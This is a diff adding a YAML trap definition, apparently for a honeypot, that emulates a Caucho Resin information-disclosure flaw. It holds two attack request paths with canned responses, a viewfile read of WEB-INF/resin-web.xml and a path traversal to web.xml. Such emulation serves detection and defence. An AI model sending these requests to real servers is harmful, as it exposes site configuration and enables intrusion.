@@ -1,0 +1,37 @@
+id: caucho-resin-info-disclosure
+info:
+  name: Caucho Resin - Information Disclosure
+  author: pikpikcu
+  description: Caucho Resin contains an information disclosure vulnerability. The
+    application does not properly sanitize user-supplied input. An attacker can potentially
+    obtain sensitive information, modify data, and/or execute unauthorized administrative
+    operations in the context of the affected site.
+  severity: info
+  reference:
+  - https://www.exploit-db.com/exploits/27888
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
+    cvss-score: 0
+    cwe-id: CWE-200
+  metadata:
+    max-request: 2
+  tags: exposure,resin,caucho,edb
+traps:
+- request:
+    method: GET
+    path: /resin-doc/viewfile/?file=/WEB-INF/resin-web.xml
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <web-app</web-app>
+- request:
+    method: GET
+    path: /%20../web-inf/web.xml
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
